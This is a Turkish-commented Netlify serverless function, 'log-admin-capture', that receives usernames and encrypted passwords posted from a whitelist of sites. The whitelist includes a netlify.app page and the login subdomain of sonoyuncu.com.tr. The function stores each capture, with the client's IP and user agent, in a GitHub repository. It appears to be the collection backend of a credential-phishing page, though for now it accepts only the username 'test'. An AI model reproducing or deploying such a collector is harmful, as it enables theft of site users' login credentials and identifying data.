// netlify/functions/log-admin-capture.js
// Sadece GEÇERLİ admin POST'u geldiğinde log yazar; diğer her durumda 204 döner (dosya yazmaz).

const OWNER   = "Devrim-Sert";
const REPO    = "REPO";
const LOG_DIR = "logs/admin";
const TOKEN   = process.env.GITHUB_TOKEN;

// Sitenin izinli origin/referrer listesi (gerekirse ekle/çıkar)
const ORIGIN_WHITELIST = [
  "https://candid-capybara-606c8d.netlify.app",
  "https://sonoyuncu.com.tr",
  "https://giris.sonoyuncu.com.tr",
];

function okMethod(method) { return method === "POST"; }

function okOrigin(headers = {}) {
  const ref = (headers.origin || headers.referer || "").replace(/\/+$/, "");
  if (!ref) return false;
  return ORIGIN_WHITELIST.some(base => ref.startsWith(base));
}

function parseBody(body) {
  try { return JSON.parse(body || "{}"); } catch { return null; }
}

// SADECE gerçek admin yüklerini kabul et (aksi halde 204 ve yazma!)
function isRealPayload(p) {
  if (!p) return false;
  if (p.kind !== "admin_capture") return false;   // ön yüzden özel imza
  if (p.username !== "test") return false;        // sadece “test” kullanıcısı
  if (typeof p.pw_enc_b64 !== "string") return false;
  if (p.pw_enc_b64.length < 300) return false;    // RSA-OAEP b64 ~300+ karakter
  return true;
}

function buildPath(now, payload) {
  const day  = now.toISOString().slice(0, 10);            // YYYY-MM-DD
  const time = now.toISOString().replace(/[:.]/g, "-");   // dosya adı güvenli
  const nonce = payload && payload.nonce ? `-${payload.nonce}` : "";
  return `${LOG_DIR}/${day}/${time}${nonce}.json`;
}

// Bağımlılıksız GitHub yazma (PUT /repos/:owner/:repo/contents/:path)
async function githubWrite(path, message, contentB64) {
  // DİKKAT: path'te '/' korunmalı — encodeURI kullan!
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${encodeURI(path)}`;
  const res = await fetch(url, {
    method: "PUT",
    headers: {
      "Authorization": `Bearer ${TOKEN}`,
      "User-Agent": "netlify-fn",
      "Accept": "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      message,
      content: contentB64,
      branch: "main", // varsayılan dal farklıysa değiştir
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`GitHub write failed: ${res.status} ${text}`);
  }
}

exports.handler = async (event) => {
  const cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };

  // CORS preflight
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 204, headers: cors };
  }

  // 1) POST değilse: yazma
  if (!okMethod(event.httpMethod)) {
    return { statusCode: 204, headers: cors, body: "skip" };
  }

  // 2) Origin/Referer whitelist değilse: yazma
  const host = (event.headers && event.headers.host) || "";
  const hostOk = ORIGIN_WHITELIST.some(u => u.includes(host));
  if (!okOrigin(event.headers) && !hostOk) {
    return { statusCode: 204, headers: cors, body: "skip" };
  }

  // 3) Body yok/parse edilemiyor: yazma
  const payload = parseBody(event.body);
  if (!payload) {
    return { statusCode: 204, headers: cors, body: "skip" };
  }

  // 4) Gerçek admin payload'ı değilse: yazma
  if (!isRealPayload(payload)) {
    return { statusCode: 204, headers: cors, body: "skip" };
  }

  // 5) GERÇEK log yaz
  if (!TOKEN) {
    return { statusCode: 500, headers: cors, body: "missing GITHUB_TOKEN" };
  }

  const now = new Date();
  const path = buildPath(now, payload);
  const contentObj = {
    ts: now.toISOString(),
    username: payload.username,       // "test"
    pw_enc_b64: payload.pw_enc_b64,   // şifrelenmiş (Base64)
    ua: event.headers["user-agent"] || null,
    ip: event.headers["x-nf-client-connection-ip"] || null,
    referer: event.headers.referer || null,
    host: event.headers.host || null,
  };
  const contentB64 = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");

  try {
    await githubWrite(path, `admin log ${now.toISOString()}`, contentB64);
    return { statusCode: 200, headers: cors, body: "logged" };
  } catch (err) {
    return { statusCode: 500, headers: cors, body: `error: ${err.message || "write failed"}` };
  }
};
